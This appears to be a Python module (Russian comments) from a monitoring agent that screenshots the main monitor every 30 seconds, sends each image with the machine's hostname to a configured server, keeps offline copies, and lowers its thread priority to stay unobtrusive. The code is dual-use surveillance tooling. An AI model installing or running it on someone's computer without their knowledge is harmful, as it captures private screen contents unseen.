"""
Захват скриншотов экрана и отправка на сервер.
"""
import io
import os
import time
import logging
import threading
import requests
from datetime import datetime
from pathlib import Path

import mss
import mss.tools
from PIL import Image

from config import SERVER_URL, API_KEY, POLL_INTERVAL

logger = logging.getLogger("screenshot")

HEADERS = {"X-API-Key": API_KEY}
SCREENSHOT_INTERVAL = int(os.environ.get("SCREENSHOT_INTERVAL", "30"))  # секунд
JPEG_QUALITY = 50   # 40-60 оптимально: хорошее качество, малый размер
OFFLINE_DIR = Path(__file__).parent / "screenshots_offline"


class ScreenshotWorker:
    def __init__(self):
        self._running = False
        self._thread = None

    def start(self):
        self._running = True
        OFFLINE_DIR.mkdir(exist_ok=True)
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()
        # Снижаем приоритет потока чтобы не влиять на работу пользователя
        try:
            import ctypes
            ctypes.windll.kernel32.SetThreadPriority(
                ctypes.windll.kernel32.GetCurrentThread(), -2  # THREAD_PRIORITY_LOWEST
            )
        except Exception:
            pass

    def stop(self):
        self._running = False

    def _loop(self):
        # Сначала отправляем офлайн-буфер если есть
        self._flush_offline()

        while self._running:
            try:
                self._capture_and_send()
            except Exception as e:
                logger.warning(f"Screenshot error: {e}")
            time.sleep(SCREENSHOT_INTERVAL)

    def _capture_and_send(self):
        import socket
        timestamp = datetime.utcnow()
        ts_str = timestamp.strftime("%Y%m%d_%H%M%S")
        hostname = socket.gethostname()

        # Захват экрана через mss (быстрее чем PIL ImageGrab в 5-10 раз)
        with mss.mss() as sct:
            monitor = sct.monitors[1]  # основной монитор
            raw = sct.grab(monitor)
            img = Image.frombytes("RGB", raw.size, raw.bgra, "raw", "BGRX")

        # Сжатие в JPEG в памяти
        buf = io.BytesIO()
        img.convert("RGB").save(buf, format="JPEG", quality=JPEG_QUALITY, optimize=True)
        buf.seek(0)

        try:
            resp = requests.post(
                f"{SERVER_URL}/api/screenshot",
                files={"file": (f"{ts_str}.jpg", buf, "image/jpeg")},
                data={"hostname": hostname, "timestamp": timestamp.isoformat()},
                headers=HEADERS,
                timeout=20,
            )
            resp.raise_for_status()
        except Exception:
            # Сохраняем локально если сервер недоступен
            offline_path = OFFLINE_DIR / f"{hostname}_{ts_str}.jpg"
            buf.seek(0)
            offline_path.write_bytes(buf.read())
            raise

    def _flush_offline(self):
        """Отправляем скриншоты накопленные офлайн."""
        import socket
        hostname = socket.gethostname()
        files = sorted(OFFLINE_DIR.glob("*.jpg"))
        if not files:
            return
        for f in files:
            try:
                ts_str = f.stem.replace(f"{hostname}_", "")
                ts = datetime.strptime(ts_str, "%Y%m%d_%H%M%S")
                with open(f, "rb") as fp:
                    resp = requests.post(
                        f"{SERVER_URL}/api/screenshot",
                        files={"file": (f.name, fp, "image/jpeg")},
                        data={"hostname": hostname, "timestamp": ts.isoformat()},
                        headers=HEADERS,
                        timeout=20,
                    )
                    resp.raise_for_status()
                f.unlink()
            except Exception:
                break  # Сервер недоступен — оставляем на потом
